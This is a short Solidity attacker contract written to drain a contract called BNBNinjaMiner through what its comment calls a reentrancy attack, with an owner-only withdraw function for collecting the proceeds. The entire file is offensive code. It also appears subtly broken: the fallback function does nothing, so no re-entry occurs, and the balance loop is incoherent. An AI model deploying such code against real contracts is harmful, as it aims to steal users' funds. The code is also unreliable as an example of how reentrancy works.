//SPDX-License-Identifier: MIT

pragma solidity ^0.4.26;

import "./BNBNinjaMiner.sol";

contract Attacker {
    BNBNinjaMiner target;
    address owner;

    constructor(address _target) public {
    target = BNBNinjaMiner(_target);
    owner = msg.sender;
    }


    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this");
        _;
    }

    function attack() public payable {
        // Call sellEggs repeatedly to trigger reentrancy attack
        while (address(this).balance > 0) {
            target.sellEggs();
        }
    }

    function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
    }

    function () external payable {
    // Do nothing

    }
}